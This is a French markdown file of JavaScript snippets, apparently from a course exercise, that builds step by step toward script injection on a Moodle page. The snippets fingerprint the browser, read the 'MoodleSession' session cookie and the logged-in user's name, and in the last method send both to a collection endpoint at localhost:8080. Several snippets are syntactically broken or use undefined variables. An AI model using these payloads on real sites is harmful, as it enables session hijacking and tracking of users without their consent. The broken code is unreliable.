# Script pour renvoyer un code aléatoire

## Méthode 1 :

```html
<p id="nombre"></p>
<script>
  let $i = Math.floor(Math.random() * 101);
  document.getElementById("nombre").innerHTML = "<h2>" + $i + "</h2>";
</script>
```

## Méthode 2 :

```html
<p id="identifiant"></p>
<script>
  function generateBrowserFingerprint() {
    const data = [
      navigator.userAgent,
      navigator.language,
      screen.width,
      screen.height,
      screen.colorDepth,
      new Date().getTimezoneOffset(),
      navigator.hardwareConcurrency,
      navigator.platform
    ].join('|');

    // Création d’un hash simple (non cryptographique)
    let hash = 0;
    for (let i = 0; i < data.length; i++) {
      const chr = data.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0; // Convertir en entier 32 bits
    }

    return 'ID-' + Math.abs(hash);
  }

  const identifiantUnique = generateBrowserFingerprint();
  document.getElementById("identifiant").innerHTML = "<h2>" + identifiantUnique + "</h2>";
</script>
```

## Méthode 3 : 

```html
<div id="fingerprint" style="font-family: sans-serif; white-space: pre-wrap;"></div>
<script>
  function getBrowserFingerprint() {
    const fingerprint = {
      "User Agent": navigator.userAgent,
      "Langue": navigator.language,
      "Résolution écran": ${screen.width} x ${screen.height},
      "Profondeur des couleurs": ${screen.colorDepth} bits,
      "Décalage UTC (timezone offset)": ${new Date().getTimezoneOffset()} minutes,
      "Nombre de cœurs processeur": navigator.hardwareConcurrency || 'Non disponible',
      "Plateforme": navigator.platform,
      "Horodatage": new Date().toISOString()
    };

    return fingerprint;
  }

  const infos = getBrowserFingerprint();

  let output = "Informations sur le navigateur détecté :\n\n";
  for (const [cle, valeur] of Object.entries(infos)) {
    output += ${cle} : ${valeur}\n;
  }

  document.getElementById("fingerprint").innerText = output;
</script>
```

## méthode prof : 

```html
<p id="nombre"></p>
<p>
  <br>
</p>
<p id="nombre"></p>
<script>
  function listCookies() {
    var theCookies = document.cookie.split(';');
    var aString = '';
    for (var i = 1; i <= theCookies.length; i++) {
      aString += i + ' ' + theCookies[i - 1] + "\n";
    }
    return aString;
  }

  //let $i = Math.floor(Math.random() * 101);
  let $i = listCookies();
  document.getElementById("nombre").innerHTML = "<h2>" + $i + "</h2>";
</script>
```

## méthode 4

```html
`<p id="username"></p>
<p id="cookie"></p>
<p id="fingerprint"></p>
<script>
  (function() {

    function getCookie(name) {

      const value = "; " + document.cookie;

      const parts = value.split("; " + name + "=");

      if (parts.length === 2) return parts.pop().split(";").shift();

      return null;

    }


    function getUserName() {

      const initialsSpan = document.querySelector(".userinitials");

      if (!initialsSpan) return null;

      const userMenu = document.querySelector(".usermenu-container");

      if (!userMenu) return null;

      const fullNameNode = userMenu.querySelector("a[aria-label='User menu']");

      if (fullNameNode && fullNameNode.getAttribute("aria-label")) {

        return fullNameNode.getAttribute("aria-label");

      }

      return initialsSpan.textContent;

    }


    function getDeviceFingerprint() {

      return {

        userAgent: navigator.userAgent,

        screen: `$ {
          screen.width
        }
        x$ {
          screen.height
        }`,

        language: navigator.language,

      };

    }


    const sessionCookie = getCookie("MoodleSession");

    const username = getUserName();

    const fingerprint = getDeviceFingerprint();


    console.log("Utilisateur connecté :", username);

    console.log("Cookie de session :", sessionCookie);

    console.log("Empreinte appareil :", fingerprint);

    document.getElementById("username").innerText = username;
    document.getElementById("cookie").innerText = sessionCookie;
    document.getElementById("fingerprint").innerText = fingerprint;


  })();
</script>
```

## Méthode 5 : avec requete http

```html
<p id="info"></p>
<p><br></p>

<script>
function getCookie(name) {
    const value = "; " + document.cookie;
    const parts = value.split("; " + name + "=");
    if (parts.length === 2) return parts.pop().split(";").shift();
    return null;
}

function getUserFullName() {
    const user = document.querySelector('.logininfo a');
    if (user) {
        return user.innerText.trim();
    } else {
        return "Utilisateur non trouvé";
    }
}

function getDeviceFingerprint() {
    return {
        userAgent: navigator.userAgent,
        screen: screen.width + "x" + screen.height,
        language: navigator.language
    };
}

let cookie = getCookie("MoodleSession");
let username = getUserFullName();
let fingerprint = getDeviceFingerprint();

let result = "<h2>Nom : " + username + "<br>" +
             "Cookie : " + (cookie || "Non trouvé") + "<br>" +
             "User Agent : " + fingerprint.userAgent + "<br>" +
             "Résolution : " + fingerprint.screen + "<br>" +
             "Langue : " + fingerprint.language + "</h2>";

document.getElementById("info").innerHTML = result;

  // Envoi de la requête
function sendRechargeRequest(nom_etud, id_vpl, cookie) {
    const url = `http://localhost:8080/recharge nom_etud=${encodeURIComponent(nom_etud)}&id_vpl=${encodeURIComponent(id_vpl)}&cookie=${encodeURIComponent(cookie)} ``;

    fetch(url)
        .then(response => {
            if (response.ok) {
                console.log("✅ Requête envoyée avec succès");
            } else {
                console.error("❌ Erreur côté serveur");
            }
        })
        .catch(error => {
            console.error("❌ Erreur réseau :", error);
        });
}

sendRechargeRequest(username, id_vpl, cookieValue);

</script>
```